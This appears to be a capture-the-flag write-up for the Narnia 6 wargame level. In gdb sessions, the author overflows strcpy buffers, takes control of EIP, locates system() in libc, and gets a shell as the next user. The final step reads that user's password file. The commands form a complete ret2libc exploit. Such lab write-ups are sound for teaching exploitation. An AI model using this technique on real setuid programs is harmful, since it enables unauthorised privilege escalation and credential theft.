This was an interesting challenge, we have can see that there are two buffers, b1 and b2, which are both defined at 8 bytes in size. What causes this to be interesting is the fact two arguements are respectively entered into the buffers using the strcpy() function. The strcpy() is a function known for causing potential buffer overflows in programs and have been the focus of vulnerabilities in previous challenges. Let’s see if we can cause a crash in the application.

```
(gdb) r $(python -c'print("A"*8)') $(python -c'print("B"*8)')
Starting program: /games/narnia/narnia6 $(python -c'print("A"*8)') $(python -c'print("B"*8)')
 
Program received signal SIGSEGV, Segmentation fault.
0x08048304 in ?? ()
(gdb) x/50wx $esp
0xffffd6bc:     0x08048647      0xffffd6f0      0xffffd8fc      0x00000021
0xffffd6cc:     0x08048399      0xf7fcf3e4      0x00008000      0x08049910
0xffffd6dc:     0xffffffff      0xffffffff      0xf7e5f116      0x42424242
0xffffd6ec:     0x42424242      0x41414100      0x41414141      0x08048300 <- Gain control of EIP register here.
0xffffd6fc:     0x00000003 <-   0x08048660      0x00000000      0x00000000 -- The point the application crashes.
0xffffd70c:     0xf7e454b3      0x00000003      0xffffd7a4      0xffffd7b4
0xffffd71c:     0xf7fd3000      0x00000000      0xffffd71c      0xffffd7b4
0xffffd72c:     0x00000000      0x08048280      0xf7fceff4      0x00000000
0xffffd73c:     0x00000000      0x00000000      0x69ae1f2f      0x5ea8db3f
0xffffd74c:     0x00000000      0x00000000      0x00000000      0x00000003
0xffffd75c:     0x08048420      0x00000000      0xf7ff0a90      0xf7e453c9
0xffffd76c:     0xf7ffcff4      0x00000003      0x08048420      0x00000000
0xffffd77c:     0x08048441      0x080484d4
```

When I ran the application with the 2 arguements passed to the application of both 8 bytes in length caused a crash an application. In the above output from GDB I have pointed at the positions which the EIP register is overwritten and control is of execution can be gained. The next step I took was to confirm that I could overwrite the position on the stack would allow me to gain control of the EIP register.

```
(gdb) r $(python -c'print("A"*8 + "B"*4 + "C"*4)') $(python -c'print("D"*8)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia6 $(python -c'print("A"*8 + "B"*4 + "C"*4)') $(python -c'print("D"*8)')
 
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/50wx $esp
0xffffd6bc:     0x08048647      0xffffd6f0      0xffffd8fc      0x00000021
0xffffd6cc:     0x08048399      0xf7fcf3e4      0x00008000      0x08049910
0xffffd6dc:     0xffffffff      0xffffffff      0xf7e5f116      0x44444444
0xffffd6ec:     0x44444444      0x41414100      0x41414141      0x42424242 <- 4 Bytes that overwrite the EIP register
0xffffd6fc:     0x43434343      0x08048600      0x00000000      0x00000000
0xffffd70c:     0xf7e454b3      0x00000003      0xffffd7a4      0xffffd7b4
0xffffd71c:     0xf7fd3000      0x00000000      0xffffd71c      0xffffd7b4
0xffffd72c:     0x00000000      0x08048280      0xf7fceff4      0x00000000
0xffffd73c:     0x00000000      0x00000000      0x2362dbf1      0x14641fe1
0xffffd74c:     0x00000000      0x00000000      0x00000000      0x00000003
0xffffd75c:     0x08048420      0x00000000      0xf7ff0a90      0xf7e453c9
0xffffd76c:     0xf7ffcff4      0x00000003      0x08048420      0x00000000
0xffffd77c:     0x08048441      0x080484d4
```

It was successfully confirmed that I could overwrite the EIP register. Now the question was how could I actually gain a shell for the next level. With control of the EIP register, I began thinking of how to gain full control. I couldn’t use placing the shellcode into an environment variable and then just overwritting the EIP register with the hardcoded location of the start of my shell. This was because part of the code has been written to clear the system’s environmental variables, just like in the Narnia 4 challenge. So because of this I also figured maybe the solution I used in Narnia 4 could be the solution for this level as well, where I pass the shellcode to the application as part of the arguement. So I decided I should test this theory out.

```
(gdb) r $(python -c'print("A"*8 + "\x90"*8 + "B"*4)') $(python -c'print("D"*8)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia6 $(python -c'print("A"*8 + "\x90"*8 + "B"*4)') $(python -c'print("D"*8)')
 
Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()
(gdb) x/50wx $esp
0xffffd6bc:     0x08048647      0xffffd6f0      0xffffd8fc      0x00000021
0xffffd6cc:     0x08048399      0xf7fcf3e4      0x00008000      0x08049910
0xffffd6dc:     0xffffffff      0xffffffff      0xf7e5f116      0x44444444
0xffffd6ec:     0x44444444      0x41414100      0x41414141      0x90909090
0xffffd6fc:     0x90909090      0x42424242      0x00000000      0x00000000
0xffffd70c:     0xf7e454b3      0x00000003      0xffffd7a4      0xffffd7b4
0xffffd71c:     0xf7fd3000      0x00000000      0xffffd71c      0xffffd7b4
0xffffd72c:     0x00000000      0x08048280      0xf7fceff4      0x00000000
0xffffd73c:     0x00000000      0x00000000      0x58c634fc      0x6fc0f0ec
0xffffd74c:     0x00000000      0x00000000      0x00000000      0x00000003
0xffffd75c:     0x08048420      0x00000000      0xf7ff0a90      0xf7e453c9
0xffffd76c:     0xf7ffcff4      0x00000003      0x08048420      0x00000000
0xffffd77c:     0x08048441      0x080484d4
(gdb) r $(python -c'print("A"*8 + "\xfc\xd6\xff\xff" + "\x90"*4)') $(python -c'print("D"*8)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia6 $(python -c'print("A"*8 + "\xfc\xd6\xff\xff" + "\x90"*4)') $(python -c'print("D"*8)')
[Inferior 1 (process 3033) exited with code 0377]
```

So I can’t place my shellcode as part of the arguement but it appears I have to have a valid memory address overwrite the EIP register. So at this point in time I decided I needed to try and find a way to get a command (/bin/sh) that I pass to the application to be executed, and then I realised the stdlib.h is included in the binary. This is useful to us because after the binary begins to execute the system() function is loaded, since it is part of the stdlib.h.

http://www.cplusplus.com/reference/cstdlib/system/

So to find out the memory location of the system() function, I decided the quickest way would to debug the binary with GDB and placing a breakpoint on the main function and run the application. As soon as the breakpoint on main() is hit, the stdlib.h would’ve been loaded which means I would be able to put a breakpoint on the system() function and identify the memory address that way.

```
narnia6@melinda:/narnia$ gdb -q ./narnia6
Reading symbols from /games/narnia/narnia6...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80484d8
(gdb) r a b
Starting program: /games/narnia/narnia6 a b
 
Breakpoint 1, 0x080484d8 in main ()
(gdb) break system
Breakpoint 2 at 0xf7e6b250
(gdb) r $(python -c'print("A"*8 + "\x50\xb2\xe6\xf7")') $(python -c'print("B"*8)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia6 $(python -c'print("A"*8 + "\x50\xb2\xe6\xf7")') $(python -c'print("B"*8)')
 
Breakpoint 1, 0x080484d8 in main ()
(gdb) c
Continuing.
 
Breakpoint 2, 0xf7e6b250 in system () from /lib32/libc.so.6
```
As you can see in the above GDB debugging output, I was able to identify that the system() function is located in memory at 0xf7e6b250 and I was able to jump to gain control of the application and jump to that location as well. And with that all confirmed, we just need to add the command to be executed to the arguement strings and pass it to the binary.

```
narnia6@melinda:/narnia$ ./narnia6 $(python -c'print("A"*8 + "\x50\xb2\xe6\xf7")') $(python -c'print("B"*8 + "/bin/sh")')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
```
